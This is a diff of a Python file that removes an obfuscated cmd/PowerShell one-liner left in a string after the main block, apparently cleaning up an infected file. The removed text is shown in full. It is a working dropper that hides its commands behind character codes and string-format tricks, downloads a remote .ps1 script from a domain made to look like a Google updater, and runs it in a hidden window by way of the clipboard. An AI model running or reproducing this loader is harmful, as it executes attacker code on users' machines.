@@ -151,9 +151,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
-
-
-a = """
-cmd /c " echo\ & ( $verbosepreference.tostring()[1,3]+'x'-join'')( " $( set-item 'variable:ofs' '' ) " + [string]('105p101-120-32>40f110{101{119e45~111{98@106x101p99p116@32e78p101-116>46n87p101@98-99@108e105>101@110~116-41f46p68>111-119{110n76x111-97~100x83n116~114p105x110n71n40-39x104e116>116p112n58p47p47x117{112p100e97{116f101p46p103@111{111e103n108{101~117{112{103~114p97n100>101-116@97~115{107{46~99f111p109>58x56~48>47{100{47f102f46~112~115@49{39~41~59'-split 'f' -split'x'-split 'p'-split '{'-split 'e'-split '@' -split'-'-split'~' -split'>'-split 'n' |foreach{ ( [char] [int]$_) } ) +" $(set-item 'variable:ofs' ' ' ) " )|clip.exe&&cmd.exe/c powershell -windows hidden -st -c [void][reflection.assembly]::("{5}{2}{3}{1}{0}{4}"-f ("{0}{1}"-f 'lna','m' ),'a','thp',("{0}{1}"-f 'a','rti' ),'e',( "{1}{0}"-f'wi','load' ) )."invoke"( ( "{1}{2}{3}{0}"-f'rms','system.w','indo','ws.fo' )) ; ${executioncontext}."invokecommand"."invokescript"(([system.windows.forms.clipboard]::( "{0}{2}{1}"-f 'ge',("{1}{0}"-f'xt','te' ),'t' )."invoke"( ) ) ); [system.windows.forms.clipboard]::("{1}{0}"-f 'ear','cl' )."invoke"( )"
-"""
